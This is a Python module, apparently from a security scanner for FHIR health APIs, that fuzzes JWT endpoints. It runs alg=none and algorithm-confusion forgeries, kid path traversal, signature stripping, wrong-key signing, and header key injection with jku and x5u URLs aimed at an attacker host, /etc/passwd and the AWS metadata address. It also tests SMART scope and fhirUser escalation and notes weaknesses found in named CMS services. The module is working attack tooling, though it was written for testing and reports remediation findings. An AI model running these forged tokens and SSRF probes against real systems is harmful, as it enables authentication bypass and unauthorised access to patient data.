"""JWT algorithm and claim fuzzer.

Comprehensive JWT attack module that tests any JWT-accepting endpoint for:
- Algorithm confusion (alg=none, HS* with RS public key, etc.)
- Missing / malformed / crafted kid values
- iss/sub/client_id claim confusion
- exp manipulation (missing, past, far-future)
- jti replay protection
- Signature stripping
- Content-type confusion

Discovered patterns from CMS testing:
- DPC returns 500 on missing kid (unhandled NPE)
- DPC uses iss/sub but docs say client_id
- AB2D Okta distinguishes valid vs invalid client_id via response body
- DPC distinguishes "key not found" vs "signature wrong" error messages
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import secrets
import time
import uuid
from dataclasses import dataclass, field
from typing import Any, Callable

import httpx
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import ec, padding, rsa
from rich.console import Console

from fhirbug.core.models import (
    Finding,
    FindingCategory,
    ScanResult,
    Severity,
)

console = Console()


def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def b64url_decode(s: str) -> bytes:
    s += "=" * (4 - len(s) % 4)
    return base64.urlsafe_b64decode(s)


@dataclass
class JWTFuzzResult:
    """Result of a JWT fuzz test."""
    label: str
    status_code: int
    response_body: str
    response_headers: dict[str, str]
    error_text: str = ""      # extracted error message
    is_success: bool = False  # True if the JWT was accepted (BAD)


@dataclass
class JWTFuzzContext:
    """Context for a JWT fuzz run — provides the signing material and target."""
    target_url: str
    # How to submit the JWT to the endpoint
    submit_fn: Callable[[str], Any]  # takes jwt string, returns (status, body, headers)
    # Baseline JWT claims (will be used as defaults)
    default_header: dict[str, Any] = field(default_factory=dict)
    default_payload: dict[str, Any] = field(default_factory=dict)
    # Private key for valid signing (PEM)
    private_key_pem: bytes | None = None
    # Public key id (kid) that the target recognizes
    valid_kid: str = ""


def sign_jwt_with_key(
    header: dict, payload: dict, private_key_pem: bytes, alg: str = "RS384"
) -> str:
    """Sign a JWT with the provided RSA/EC private key."""
    h_b64 = b64url(json.dumps(header, separators=(",", ":")).encode())
    p_b64 = b64url(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h_b64}.{p_b64}".encode()

    private_key = serialization.load_pem_private_key(private_key_pem, password=None)

    if alg.startswith("RS"):
        hash_alg = {"RS256": hashes.SHA256(), "RS384": hashes.SHA384(), "RS512": hashes.SHA512()}[alg]
        sig = private_key.sign(signing_input, padding.PKCS1v15(), hash_alg)
    elif alg.startswith("PS"):
        hash_alg = {"PS256": hashes.SHA256(), "PS384": hashes.SHA384(), "PS512": hashes.SHA512()}[alg]
        sig = private_key.sign(
            signing_input,
            padding.PSS(mgf=padding.MGF1(hash_alg), salt_length=padding.PSS.MAX_LENGTH),
            hash_alg,
        )
    elif alg.startswith("ES"):
        # EC signing — note: requires an EC key, not RSA. Use for confusion tests.
        hash_alg = {"ES256": hashes.SHA256(), "ES384": hashes.SHA384(), "ES512": hashes.SHA512()}[alg]
        sig = private_key.sign(signing_input, ec.ECDSA(hash_alg))
    else:
        raise ValueError(f"Unsupported alg: {alg}")

    return f"{h_b64}.{p_b64}.{b64url(sig)}"


def sign_jwt_hmac(header: dict, payload: dict, secret: bytes, alg: str = "HS256") -> str:
    """Sign a JWT with HMAC (used for algorithm confusion attacks)."""
    h_b64 = b64url(json.dumps(header, separators=(",", ":")).encode())
    p_b64 = b64url(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h_b64}.{p_b64}".encode()

    hash_alg = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}[alg]
    sig = hmac.new(secret, signing_input, hash_alg).digest()

    return f"{h_b64}.{p_b64}.{b64url(sig)}"


def build_unsigned_jwt(header: dict, payload: dict, sig: bytes = b"") -> str:
    """Build a JWT with no / arbitrary signature."""
    h_b64 = b64url(json.dumps(header, separators=(",", ":")).encode())
    p_b64 = b64url(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h_b64}.{p_b64}.{b64url(sig)}"


def extract_error_text(body: str) -> str:
    """Extract a concise error message from a response body."""
    try:
        d = json.loads(body)
        # FHIR OperationOutcome
        if isinstance(d, dict):
            issues = d.get("issue", [])
            if issues:
                return issues[0].get("details", {}).get("text", "") or issues[0].get("diagnostics", "")
            # OAuth error format
            if "error_description" in d:
                return f"{d.get('error', '')}: {d['error_description']}"
            if "error" in d:
                return str(d["error"])
    except (json.JSONDecodeError, TypeError):
        pass
    return body[:200]


class JWTFuzzer:
    """Runs a comprehensive JWT attack suite against a target."""

    def __init__(self, context: JWTFuzzContext):
        self.ctx = context
        self.results: list[JWTFuzzResult] = []

    async def _test(self, label: str, jwt: str) -> JWTFuzzResult:
        """Submit a JWT and record the result."""
        try:
            status, body, headers = await self.ctx.submit_fn(jwt)
        except Exception as e:
            return JWTFuzzResult(
                label=label, status_code=0,
                response_body=f"exception: {e}",
                response_headers={},
                error_text=str(e)[:200],
            )

        result = JWTFuzzResult(
            label=label,
            status_code=status,
            response_body=body[:1000] if isinstance(body, str) else str(body)[:1000],
            response_headers={k: v for k, v in headers.items() if k.lower() in (
                "www-authenticate", "content-type", "x-amzn-trace-id",
            )},
            error_text=extract_error_text(body if isinstance(body, str) else ""),
            is_success=(status == 200 or status == 201),
        )
        self.results.append(result)
        return result

    async def run_algorithm_tests(self) -> None:
        """Test JWT algorithm confusion attacks."""
        console.print("\n[bold]JWT Algorithm Attack Tests[/]")
        baseline_header = dict(self.ctx.default_header)
        baseline_payload = dict(self.ctx.default_payload)

        # alg=none
        header = {**baseline_header, "alg": "none"}
        jwt = build_unsigned_jwt(header, baseline_payload)
        r = await self._test("alg=none (unsigned)", jwt)
        console.print(f"  [{r.status_code}] alg=none: {r.error_text[:100]}")

        # Algorithm confusion: HS* with the public key as the shared secret
        for hs_alg in ["HS256", "HS384", "HS512"]:
            # If we have the public key, use it as the HMAC secret
            public_key_pem = self._extract_public_key_from_private()
            if public_key_pem:
                header = {**baseline_header, "alg": hs_alg}
                jwt = sign_jwt_hmac(header, baseline_payload, public_key_pem, hs_alg)
                r = await self._test(
                    f"alg={hs_alg} with public key as secret", jwt
                )
                console.print(f"  [{r.status_code}] {hs_alg} confusion: {r.error_text[:100]}")

        # Wrong asymmetric algorithm (alg header lies about the actual signature)
        for wrong_alg in ["RS256", "RS512", "PS256", "ES256"]:
            if wrong_alg == (baseline_header.get("alg") or "RS384"):
                continue
            if self.ctx.private_key_pem:
                try:
                    header = {**baseline_header, "alg": wrong_alg}
                    jwt = sign_jwt_with_key(
                        header, baseline_payload, self.ctx.private_key_pem, wrong_alg
                    )
                    r = await self._test(f"alg={wrong_alg} (wrong alg)", jwt)
                    console.print(f"  [{r.status_code}] {wrong_alg}: {r.error_text[:100]}")
                except Exception as e:
                    console.print(f"  [skip] {wrong_alg}: {e}")

    def _extract_public_key_from_private(self) -> bytes | None:
        """Extract the public key PEM from the private key."""
        if not self.ctx.private_key_pem:
            return None
        try:
            priv = serialization.load_pem_private_key(
                self.ctx.private_key_pem, password=None
            )
            return priv.public_key().public_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PublicFormat.SubjectPublicKeyInfo,
            )
        except Exception:
            return None

    def _ephemeral_rsa(self) -> tuple[Any, bytes]:
        """Generate (and cache) an ephemeral RSA key + PEM used across header-injection / wrong-key tests."""
        if not hasattr(self, "_ephemeral_key"):
            key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
            pem = key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.PKCS8,
                encryption_algorithm=serialization.NoEncryption(),
            )
            self._ephemeral_key = (key, pem)
        return self._ephemeral_key

    async def _probe_and_log(self, label: str, jwt: str, highlight_500: bool = False) -> JWTFuzzResult:
        """Submit a JWT, log with a consistent marker, return the result.

        Marker semantics: 🚨 on 200 (bypass-shaped success), ⚠ on 500 (unhandled exception) when highlight_500,
        space otherwise.
        """
        r = await self._test(label, jwt)
        if r.status_code == 200:
            marker = "🚨"
        elif highlight_500 and r.status_code == 500:
            marker = "⚠"
        else:
            marker = " "
        console.print(f"  {marker} [{r.status_code}] {label}: {r.error_text[:100]}")
        return r

    async def run_kid_tests(self) -> None:
        """Test kid manipulation."""
        console.print("\n[bold]JWT kid Manipulation Tests[/]")
        if not self.ctx.private_key_pem:
            console.print("  [yellow]Skipping — no private key for signing[/]")
            return

        alg = self.ctx.default_header.get("alg", "RS384")
        baseline_payload = dict(self.ctx.default_payload)

        kid_variants = [
            ("missing kid", None),
            ("empty kid", ""),
            ("null kid", None),
            ("non-existent UUID", "00000000-0000-0000-0000-000000000000"),
            ("random UUID", "aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa"),
            ("non-UUID format", "wrong-format-12345"),
            ("path traversal kid", f"{self.ctx.valid_kid}/../other"),
            ("kid with null byte", f"{self.ctx.valid_kid}\x00"),
            ("kid with newline", f"{self.ctx.valid_kid}\n"),
            ("kid with long value", "a" * 10000),
        ]

        for label, kid in kid_variants:
            header = dict(self.ctx.default_header)
            if kid is None:
                header.pop("kid", None)
            else:
                header["kid"] = kid
            try:
                jwt = sign_jwt_with_key(
                    header, baseline_payload, self.ctx.private_key_pem, alg
                )
            except Exception as e:
                console.print(f"  [skip] {label}: {e}")
                continue
            r = await self._test(f"kid: {label}", jwt)
            marker = "🚨" if r.status_code == 200 else ("⚠" if r.status_code == 500 else " ")
            console.print(f"  {marker} [{r.status_code}] {label}: {r.error_text[:100]}")

    async def run_claim_tests(self) -> None:
        """Test payload claim manipulation."""
        console.print("\n[bold]JWT Claim Manipulation Tests[/]")
        if not self.ctx.private_key_pem:
            return

        alg = self.ctx.default_header.get("alg", "RS384")
        now = int(time.time())

        # Test cases
        test_cases = [
            ("empty payload", {}),
            ("only iat", {"iat": now}),
            ("only exp", {"exp": now + 300}),
            ("exp in past", {**self.ctx.default_payload, "exp": now - 1}),
            ("exp far future (1y)", {**self.ctx.default_payload, "exp": now + 365 * 86400}),
            ("exp = 0", {**self.ctx.default_payload, "exp": 0}),
            ("exp as string", {**self.ctx.default_payload, "exp": str(now + 300)}),
            ("no iss", {k: v for k, v in self.ctx.default_payload.items() if k != "iss"}),
            ("no sub", {k: v for k, v in self.ctx.default_payload.items() if k != "sub"}),
            ("iss != sub", {**self.ctx.default_payload, "sub": "different_value"}),
            ("wrong aud", {**self.ctx.default_payload, "aud": "https://evil.example.com"}),
            ("empty aud", {**self.ctx.default_payload, "aud": ""}),
            ("aud as array", {**self.ctx.default_payload, "aud": ["x", "y"]}),
            ("extra client_id claim", {**self.ctx.default_payload, "client_id": "fake"}),
            ("no jti", {k: v for k, v in self.ctx.default_payload.items() if k != "jti"}),
            ("empty jti", {**self.ctx.default_payload, "jti": ""}),
        ]

        for label, payload in test_cases:
            try:
                jwt = sign_jwt_with_key(
                    self.ctx.default_header, payload, self.ctx.private_key_pem, alg
                )
            except Exception as e:
                console.print(f"  [skip] {label}: {e}")
                continue
            r = await self._test(f"claim: {label}", jwt)
            marker = "🚨" if r.status_code == 200 else " "
            console.print(f"  {marker} [{r.status_code}] {label}: {r.error_text[:100]}")

    async def run_jti_replay_test(self) -> None:
        """Test jti replay protection by reusing the same jti twice."""
        console.print("\n[bold]JWT jti Replay Test[/]")
        if not self.ctx.private_key_pem:
            return

        alg = self.ctx.default_header.get("alg", "RS384")
        fixed_jti = f"replay-test-{secrets.token_hex(8)}"

        for attempt in (1, 2):
            payload = {**self.ctx.default_payload, "jti": fixed_jti}
            # Also refresh iat/exp to keep the JWT fresh
            now = int(time.time())
            payload["iat"] = now
            payload["exp"] = now + 300
            jwt = sign_jwt_with_key(
                self.ctx.default_header, payload, self.ctx.private_key_pem, alg
            )
            r = await self._test(f"jti replay attempt #{attempt}", jwt)
            console.print(f"  Attempt {attempt}: [{r.status_code}] {r.error_text[:100]}")

            if attempt == 2 and r.status_code == 200:
                console.print("  [red]🚨 jti replay NOT blocked![/]")

    async def run_structural_tests(self) -> None:
        """Test malformed JWT structures."""
        console.print("\n[bold]JWT Structural Attack Tests[/]")

        tests = [
            ("empty string", ""),
            ("single dot", "."),
            ("two dots", ".."),
            ("three dots", "..."),
            ("header only", "eyJhbGciOiJSUzM4NCJ9"),
            ("header.payload no sig", "eyJhbGciOiJSUzM4NCJ9.eyJzdWIiOiJ4In0."),
            ("header.payload.garbage", "eyJhbGciOiJSUzM4NCJ9.eyJzdWIiOiJ4In0.xxxxxxxx"),
            ("4-segment JWT", "eyJhbGciOiJSUzM4NCJ9.eyJzdWIiOiJ4In0.sig.extra"),
            ("very long garbage", "A" * 100000),
            ("UTF-8 garbage", "🚀.🔥.💥"),
        ]

        for label, jwt in tests:
            r = await self._test(f"struct: {label}", jwt)
            marker = "⚠" if r.status_code == 500 else " "
            console.print(f"  {marker} [{r.status_code}] {label}: {r.error_text[:100]}")

    async def run_sig_stripping_tests(self) -> None:
        """Test signature-stripping attacks: empty sig, truncated sig, sig from a different key."""
        console.print("\n[bold]JWT Signature Stripping Tests[/]")
        if not self.ctx.private_key_pem:
            console.print("  [yellow]Skipping — no private key for baseline signing[/]")
            return

        alg = self.ctx.default_header.get("alg", "RS384")
        header = dict(self.ctx.default_header)
        payload = dict(self.ctx.default_payload)

        try:
            valid_jwt = sign_jwt_with_key(header, payload, self.ctx.private_key_pem, alg)
        except Exception as e:
            console.print(f"  [red]Skipping sig-stripping — baseline signing failed: {e}[/]")
            return

        h_b64, p_b64, valid_sig = valid_jwt.split(".")
        zero_sig = b64url(b"\x00" * 32)

        variants = [
            ("empty signature", f"{h_b64}.{p_b64}."),
            ("truncated signature (first half)", f"{h_b64}.{p_b64}.{valid_sig[: len(valid_sig) // 2]}"),
            ("truncated signature (1 byte)", f"{h_b64}.{p_b64}.{valid_sig[:1]}"),
            ("zero-byte signature", f"{h_b64}.{p_b64}.{zero_sig}"),
            ("garbage base64 signature", f"{h_b64}.{p_b64}.AAAA"),
            ("whitespace signature", f"{h_b64}.{p_b64}. "),
        ]

        for label, jwt in variants:
            await self._probe_and_log(f"sig: {label}", jwt, highlight_500=True)

    async def run_wrong_key_tests(self) -> None:
        """Sign with a valid-but-unregistered RSA key to check if server verifies against registered pubkey."""
        console.print("\n[bold]JWT Wrong-Key Signing Tests[/]")
        if not self.ctx.private_key_pem:
            console.print("  [yellow]Skipping — no baseline key to compare against[/]")
            return

        _, ephemeral_pem = self._ephemeral_rsa()
        alg = self.ctx.default_header.get("alg", "RS384")
        header = dict(self.ctx.default_header)
        payload = dict(self.ctx.default_payload)

        # With valid kid — tests whether the server looks up pubkey by kid vs. accepts any well-signed JWT
        try:
            jwt = sign_jwt_with_key(header, payload, ephemeral_pem, alg)
            await self._probe_and_log("wrong-key: valid kid + ephemeral key", jwt)
        except Exception as e:
            console.print(f"  [skip] valid kid + ephemeral key: {e}")

        # Without kid — tests whether kid-less signed JWTs get accepted at all
        try:
            header_no_kid = {k: v for k, v in header.items() if k != "kid"}
            jwt = sign_jwt_with_key(header_no_kid, payload, ephemeral_pem, alg)
            await self._probe_and_log("wrong-key: no kid + ephemeral key", jwt, highlight_500=True)
        except Exception as e:
            console.print(f"  [skip] no kid + ephemeral key: {e}")

    async def run_alg_case_tests(self) -> None:
        """Test algorithm-name case sensitivity — classic bypass against naive allowlists."""
        console.print("\n[bold]JWT Algorithm Case-Variant Tests[/]")
        baseline_header = dict(self.ctx.default_header)
        baseline_payload = dict(self.ctx.default_payload)

        # Case variants of 'none' — if the validator does a case-sensitive compare against
        # 'none' but a case-insensitive accept anywhere downstream, these sneak through.
        for variant in ["None", "NONE", "nONe", "NoNe", "NonE", "noNe"]:
            header = {**baseline_header, "alg": variant}
            jwt = build_unsigned_jwt(header, baseline_payload)
            await self._probe_and_log(f"alg case: {variant}", jwt)

        # Case variants of HS256 — sign via the standard helper (which keys on the `alg`
        # argument, not the value in `header["alg"]`), so we can set header to the cased
        # variant while actually computing a real HS256 MAC.
        public_key_pem = self._extract_public_key_from_private()
        if public_key_pem:
            for variant in ["hs256", "Hs256", "hS256"]:
                header = {**baseline_header, "alg": variant}
                try:
                    jwt = sign_jwt_hmac(header, baseline_payload, public_key_pem, "HS256")
                    await self._probe_and_log(f"alg case: {variant} w/ pubkey", jwt)
                except Exception as e:
                    console.print(f"  [skip] {variant}: {e}")

    async def run_header_key_injection_tests(self) -> None:
        """Test jwk-embedded, jku, x5c, x5u header attacks."""
        console.print("\n[bold]JWT Header Key-Injection Tests[/]")
        if not self.ctx.private_key_pem:
            console.print("  [yellow]Skipping — no baseline key[/]")
            return

        attacker_key, attacker_pem = self._ephemeral_rsa()
        attacker_pub_numbers = attacker_key.public_key().public_numbers()

        def int_to_b64url(n: int) -> str:
            byte_len = (n.bit_length() + 7) // 8
            return b64url(n.to_bytes(byte_len, "big"))

        attacker_jwk = {
            "kty": "RSA",
            "n": int_to_b64url(attacker_pub_numbers.n),
            "e": int_to_b64url(attacker_pub_numbers.e),
            "alg": "RS256",
            "kid": "attacker-injected-key",
        }

        alg = "RS256"
        baseline_payload = dict(self.ctx.default_payload)

        async def _inject(label: str, extra_header_fields: dict) -> None:
            header = {**self.ctx.default_header, "alg": alg, "typ": "JWT", **extra_header_fields}
            try:
                jwt = sign_jwt_with_key(header, baseline_payload, attacker_pem, alg)
            except Exception as e:
                console.print(f"  [skip] {label}: {e}")
                return
            await self._probe_and_log(f"header-inject: {label}", jwt, highlight_500=True)

        # jwk embedded in header — server may trust header-provided key (CVE-2018-1000531 class)
        await _inject("jwk embedded", {"jwk": attacker_jwk})

        # jku header pointing at attacker-controlled URL. Actual exploitation requires
        # attacker-hosted JWKS; this confirms whether the server even parses/fetches jku.
        for jku_url in [
            "https://attacker.example.com/.well-known/jwks.json",
            "file:///etc/passwd",
            "http://localhost:9999/jwks.json",
            "http://169.254.169.254/latest/meta-data/",  # AWS IMDS SSRF probe
        ]:
            await _inject(f"jku={jku_url[:50]}", {"jku": jku_url, "kid": self.ctx.valid_kid})

        # x5c — embed attacker pubkey integer as a fake cert entry (CVE-2022-21449 class).
        # Most parsers reject non-cert structure; some older implementations validate sig anyway.
        fake_cert_b64 = int_to_b64url(attacker_pub_numbers.n)
        await _inject("x5c embedded", {"x5c": [fake_cert_b64]})

        # x5u — cert URL (SSRF surface)
        await _inject("x5u SSRF probe", {"x5u": "http://169.254.169.254/"})

    async def run_smart_scope_tests(self, smart_scopes: list[str] | None = None) -> None:
        """Test SMART-on-FHIR scope claim manipulation in the client_assertion JWT.

        This targets the FHIR-authz layer rather than the JWT-validator layer. The
        hypothesis: can the caller escalate granted scope by embedding a broader
        scope claim in the assertion JWT than was registered at app-registration
        time? Mostly a null-result probe — well-implemented servers ignore scope
        in client_assertion — but finding a server that doesn't is a bounty-grade
        finding.
        """
        console.print("\n[bold]SMART-on-FHIR Scope Claim Tests[/]")
        if not self.ctx.private_key_pem:
            console.print("  [yellow]Skipping — no private key[/]")
            return

        alg = self.ctx.default_header.get("alg", "RS384")

        # Default scope matrix to test — narrow-to-broad escalation
        scopes = smart_scopes or [
            "patient/*.read",                    # narrow — single-patient read
            "patient/*.*",                       # broader — single-patient all
            "user/*.read",                       # broader still — cross-patient read
            "user/*.*",                          # much broader
            "system/*.read",                     # system-wide read
            "system/*.*",                        # system-wide all (dangerous)
            "*",                                 # wildcard (classic misparse)
            "admin",                             # non-standard (probe for role-by-scope)
            "",                                  # empty scope — some servers default to max
            "system/Patient.read system/Patient.write system/*.*",  # space-separated list
        ]

        for scope in scopes:
            payload = {**self.ctx.default_payload, "scope": scope}
            try:
                jwt = sign_jwt_with_key(
                    self.ctx.default_header, payload, self.ctx.private_key_pem, alg
                )
            except Exception as e:
                console.print(f"  [skip] scope={scope[:40]}: {e}")
                continue
            # Note: for scope tests, the response body matters more than status —
            # the issued token's actual granted scope should be inspected separately.
            await self._probe_and_log(f"smart-scope: {scope[:40]}", jwt)

        # Also test: fhirUser claim impersonation (SMART-on-FHIR user claim)
        for fhir_user in [
            "Practitioner/admin",
            "Practitioner/system",
            "Practitioner/*",
            "../admin",
            "https://attacker.example.com/Practitioner/1",
        ]:
            payload = {**self.ctx.default_payload, "fhirUser": fhir_user}
            try:
                jwt = sign_jwt_with_key(
                    self.ctx.default_header, payload, self.ctx.private_key_pem, alg
                )
            except Exception as e:
                console.print(f"  [skip] fhirUser={fhir_user[:40]}: {e}")
                continue
            await self._probe_and_log(f"smart-fhirUser: {fhir_user}", jwt)

    def get_findings(self, result: ScanResult) -> None:
        """Analyze fuzz results and add findings to the scan result."""
        # Count 500 errors — unhandled exceptions
        unhandled = [r for r in self.results if r.status_code >= 500]
        if unhandled:
            unique_errors = set(r.error_text[:80] for r in unhandled)
            result.add_finding(Finding(
                title=f"{len(unique_errors)} unhandled exception classes triggered on JWT endpoint",
                severity=Severity.MEDIUM,
                category=FindingCategory.CONFIG,
                description=(
                    "The JWT endpoint returned HTTP 5xx errors for multiple input classes, "
                    "indicating unhandled exceptions in the authentication code path. Each "
                    "distinct exception text represents a missing try/catch block."
                ),
                endpoint=self.ctx.target_url,
                evidence={
                    "unique_exceptions": sorted(unique_errors),
                    "triggering_tests": [r.label for r in unhandled],
                },
                remediation=(
                    "Add defensive exception handling around JWT parsing, macaroon "
                    "deserialization, UUID parsing, and field access. Return uniform 400 "
                    "responses for malformed inputs without leaking Java/Python exception messages."
                ),
            ))

        # Successful attacks (status 200 on non-baseline JWTs)
        successes = [r for r in self.results if r.is_success and r.label != "baseline"]
        if successes:
            critical_alg_bypass = [
                r for r in successes
                if "alg=none" in r.label or "HS" in r.label or "alg case:" in r.label
            ]
            if critical_alg_bypass:
                result.add_finding(Finding(
                    title="JWT algorithm confusion / alg=none accepted",
                    severity=Severity.CRITICAL,
                    category=FindingCategory.AUTHN,
                    description=(
                        "The server accepted a JWT with a weakened or absent signature "
                        "algorithm. This allows forgery of arbitrary tokens."
                    ),
                    endpoint=self.ctx.target_url,
                    evidence={"bypasses": [r.label for r in critical_alg_bypass]},
                ))

            # Signature stripping / wrong-key acceptance
            sig_bypass = [
                r for r in successes
                if r.label.startswith("sig:") or r.label.startswith("wrong-key:")
            ]
            if sig_bypass:
                result.add_finding(Finding(
                    title="JWT signature not properly validated",
                    severity=Severity.CRITICAL,
                    category=FindingCategory.AUTHN,
                    description=(
                        "The server accepted a JWT whose signature was empty, truncated, "
                        "or signed with an unregistered key. This is a complete authentication "
                        "bypass — any attacker can forge tokens."
                    ),
                    endpoint=self.ctx.target_url,
                    evidence={"bypasses": [r.label for r in sig_bypass]},
                ))

            # Header-based key injection bypass
            header_inject_bypass = [r for r in successes if r.label.startswith("header-inject:")]
            if header_inject_bypass:
                result.add_finding(Finding(
                    title="JWT header key-injection bypass",
                    severity=Severity.CRITICAL,
                    category=FindingCategory.AUTHN,
                    description=(
                        "The server trusted key material embedded in the JWT header "
                        "(jwk / jku / x5c / x5u), allowing an attacker to sign tokens "
                        "with a key they control and have the server verify against it."
                    ),
                    endpoint=self.ctx.target_url,
                    evidence={"bypasses": [r.label for r in header_inject_bypass]},
                ))

            # SMART scope escalation
            scope_escalation = [r for r in successes if r.label.startswith("smart-scope:")]
            broad_scope_granted = [
                r for r in scope_escalation
                if any(s in r.label for s in ["system/", "user/", "*"])
            ]
            if broad_scope_granted:
                result.add_finding(Finding(
                    title="SMART-on-FHIR scope claim honored in client_assertion",
                    severity=Severity.HIGH,
                    category=FindingCategory.AUTHN,
                    description=(
                        "The server accepted a client_assertion JWT containing a broader "
                        "`scope` claim than was registered for the client, and issued a "
                        "token reflecting the requested scope. Clients may escalate scope "
                        "by embedding arbitrary values in the assertion. Verify the returned "
                        "access token's actual granted scope — if it matches the requested "
                        "(broader) scope, this is a scope-escalation vulnerability. If the "
                        "server issued the default (narrower) scope anyway, this is "
                        "informational."
                    ),
                    endpoint=self.ctx.target_url,
                    evidence={"accepted_scopes": [r.label for r in broad_scope_granted]},
                    remediation=(
                        "Ignore any `scope` claim in the client_assertion; scope must be "
                        "derived solely from the client's registered configuration, or from "
                        "a separate `scope` request parameter validated against the "
                        "registered scope set."
                    ),
                ))

            # fhirUser impersonation
            fhir_user_impers = [r for r in successes if r.label.startswith("smart-fhirUser:")]
            if fhir_user_impers:
                result.add_finding(Finding(
                    title="SMART-on-FHIR fhirUser claim accepted in client_assertion",
                    severity=Severity.HIGH,
                    category=FindingCategory.AUTHN,
                    description=(
                        "The server accepted a client_assertion JWT containing an "
                        "attacker-controlled `fhirUser` claim. If downstream operations "
                        "treat `fhirUser` as the acting principal, this enables user "
                        "impersonation."
                    ),
                    endpoint=self.ctx.target_url,
                    evidence={"accepted_fhirUsers": [r.label for r in fhir_user_impers]},
                ))

        # Distinct error messages per validation step (validation order leak)
        error_messages = set()
        for r in self.results:
            if r.status_code >= 400 and r.error_text:
                error_messages.add(r.error_text[:120])

        if len(error_messages) > 5:
            result.add_finding(Finding(
                title=f"JWT validation order leaked via {len(error_messages)} distinct error messages",
                severity=Severity.LOW,
                category=FindingCategory.INFO_DISC,
                description=(
                    "The endpoint returns unique error messages for each validation step, "
                    "enabling attackers to map the full JWT validation chain and craft "
                    "targeted probes."
                ),
                endpoint=self.ctx.target_url,
                evidence={"distinct_errors": sorted(error_messages)[:20]},
                remediation=(
                    "Return a uniform error message (e.g., 'Invalid token') for all JWT "
                    "validation failures. Log details server-side only."
                ),
            ))


async def run_full_jwt_fuzz(
    target_url: str,
    submit_fn: Callable[[str], Any],
    default_header: dict,
    default_payload: dict,
    result: ScanResult,
    private_key_pem: bytes | None = None,
    valid_kid: str = "",
) -> None:
    """Run all JWT fuzz tests against a target endpoint."""
    ctx = JWTFuzzContext(
        target_url=target_url,
        submit_fn=submit_fn,
        default_header=default_header,
        default_payload=default_payload,
        private_key_pem=private_key_pem,
        valid_kid=valid_kid,
    )
    fuzzer = JWTFuzzer(ctx)

    await fuzzer.run_algorithm_tests()
    await fuzzer.run_kid_tests()
    await fuzzer.run_claim_tests()
    await fuzzer.run_jti_replay_test()
    await fuzzer.run_structural_tests()
    await fuzzer.run_sig_stripping_tests()
    await fuzzer.run_wrong_key_tests()
    await fuzzer.run_alg_case_tests()
    await fuzzer.run_header_key_injection_tests()
    await fuzzer.run_smart_scope_tests()

    fuzzer.get_findings(result)
    console.print(f"\n[bold]JWT fuzz complete: {len(fuzzer.results)} tests run[/]")
